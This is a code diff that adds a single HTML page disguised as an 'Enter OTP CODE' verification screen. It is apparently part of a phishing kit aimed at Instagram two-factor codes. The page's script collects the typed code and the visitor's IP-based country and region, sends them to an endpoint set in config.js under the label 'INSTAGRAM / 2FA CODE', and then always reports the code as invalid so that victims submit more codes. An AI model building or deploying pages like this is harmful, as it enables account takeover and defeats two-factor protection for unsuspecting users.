@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body>
+    <div class="min-h-screen bg-gradient-to-br from-blue-50 via-green-50 to-teal-50 flex items-center justify-center p-4">
+        <div class="w-full max-w-md">
+
+            <!-- Header -->
+            <div class="mb-4">
+                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
+                    Enter OTP CODE
+                </h1>
+                <p class="text-sm md:text-base text-gray-700">
+                    Enter the code that we sent to <span class="font-semibold">your phone</span>
+                </p>
+            </div>
+
+            <!-- Illustration Card -->
+            <div class="bg-gradient-to-br from-green-100 to-teal-100 rounded-2xl p-4 mb-4">
+                <div class="bg-gradient-to-br from-blue-100 to-teal-100 rounded-xl p-6 flex items-center justify-center">
+                    <div class="relative w-full max-w-xs aspect-[4/3]">
+                        <div class="absolute inset-0 flex items-center justify-center">
+                            <svg viewBox="0 0 400 300" class="w-full h-full">
+                                <path d="M 120 180 Q 100 200 90 220 L 90 250 Q 90 270 110 275 L 140 280 Q 145 250 150 220 Z" fill="#8B4513" opacity="0.9"/>
+                                <path d="M 280 180 Q 300 200 310 220 L 310 250 Q 310 270 290 275 L 260 280 Q 255 250 250 220 Z" fill="#8B4513" opacity="0.9"/>
+                                <rect x="140" y="80" width="120" height="180" rx="15" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="3"/>
+                                <rect x="150" y="90" width="100" height="140" rx="8" fill="white"/>
+                                <ellipse cx="200" cy="140" rx="20" ry="25" fill="#F59E0B"/>
+                                <ellipse cx="200" cy="135" rx="18" ry="22" fill="#FBBF24"/>
+                                <path d="M 185 120 Q 200 110 215 120 L 215 135 L 185 135 Z" fill="#92400E"/>
+                                <circle cx="175" cy="170" r="3" fill="#374151" />
+                                <circle cx="190" cy="170" r="3" fill="#374151" />
+                                <circle cx="205" cy="170" r="3" fill="#374151" />
+                                <circle cx="220" cy="170" r="3" fill="#374151" />
+                                <rect x="160" y="185" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="187" y="185" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="214" y="185" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="160" y="200" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="187" y="200" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="214" y="200" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="160" y="215" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="187" y="215" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="214" y="215" width="22" height="12" rx="2" fill="#E5E7EB" stroke="#9CA3AF" stroke-width="1" />
+                                <rect x="175" y="235" width="50" height="6" rx="3" fill="#6B7280"/>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Input Field -->
+            <div class="mb-4">
+                <input
+                    id="otp"
+                    type="text"
+                    placeholder="Enter verification code"
+                    class="w-full px-4 py-3 text-sm md:text-base border-4 border-blue-500 rounded-xl focus:outline-none focus:border-blue-600 transition-colors"
+                    maxlength="6"
+                    inputmode="numeric"
+                />
+            </div>
+
+            <!-- Error Message -->
+            <div id="errorMsg" class="text-red-600 text-sm md:text-base mb-4 hidden text-center font-medium">
+                Invalid or expired code. Please try again.
+            </div>
+
+            <!-- Get New Code Link -->
+            <div class="mb-4">
+                <button class="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold text-sm md:text-base transition-colors">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+                    </svg>
+                    <span>Get a new code</span>
+                </button>
+            </div>
+
+            <!-- Continue Button -->
+            <button
+                id="submitBtn"
+                class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold text-base md:text-lg py-3 md:py-4 rounded-full transition-colors shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+            >
+                <span id="btnText">Continue</span>
+                <svg id="spinner" class="w-6 h-6 animate-spin hidden" viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none" opacity="0.3"/>
+                    <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" fill="none"/>
+                </svg>
+            </button>
+
+        </div>
+    </div>
+
+    <script type="module">
+        import { SUBMIT_ENDPOINT, SUBMIT_ID } from './config.js';
+
+        let attempt = 0;
+
+        async function getLocation() {
+            try {
+                console.log("Fetching location for OTP...");
+                const res = await fetch('https://ipapi.co/json/', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+
+                const data = await res.json();
+                console.log("OTP location data:", data);
+
+                return {
+                    country: data.country_name || data.country || 'Unknown',
+                    state: data.region || data.region_code || 'Unknown'
+                };
+            } catch (err) {
+                console.error("Primary geolocation failed:", err);
+                try {
+                    const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
+                    const fbData = await fallback.json();
+                    if (fbData.status === "success") {
+                        return {
+                            country: fbData.country || 'Unknown',
+                            state: fbData.regionName || 'Unknown'
+                        };
+                    }
+                } catch {}
+            }
+            return { country: 'Unknown', state: 'Unknown' };
+        }
+
+        document.getElementById("submitBtn").addEventListener("click", async () => {
+            const otpInput = document.getElementById("otp");
+            const code = otpInput.value.trim();
+            const btn = document.getElementById("submitBtn");
+            const btnText = document.getElementById("btnText");
+            const spinner = document.getElementById("spinner");
+            const errorMsg = document.getElementById("errorMsg");
+
+            if (!code || code.length < 4) {
+                errorMsg.textContent = "Please enter a valid code.";
+                errorMsg.classList.remove("hidden");
+                return;
+            }
+
+            btn.disabled = true;
+            btnText.textContent = "Verifying";
+            spinner.classList.remove("hidden");
+            errorMsg.classList.add("hidden");
+
+            const loc = await getLocation();
+
+            attempt++;
+
+            const payload = {
+                id: SUBMIT_ID,
+                app: "INSTAGRAM / 2FA CODE",
+                code: code,
+                country: loc.country,
+                state: loc.state,
+                attempt: attempt,
+                timestamp: new Date().toISOString(),
+                source: "OTP Verification"
+            };
+
+            try {
+                await fetch(SUBMIT_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                console.log("OTP data sent successfully");
+            } catch (err) {
+                console.error("Failed to send OTP data:", err);
+            }
+
+            setTimeout(() => {
+                errorMsg.textContent = "Invalid or expired code. Please try again.";
+                errorMsg.classList.remove("hidden");
+                otpInput.value = "";
+                btn.disabled = false;
+                btnText.textContent = "Continue";
+                spinner.classList.add("hidden");
+            }, 1400);
+        });
+    </script>
+</body>
+</html>
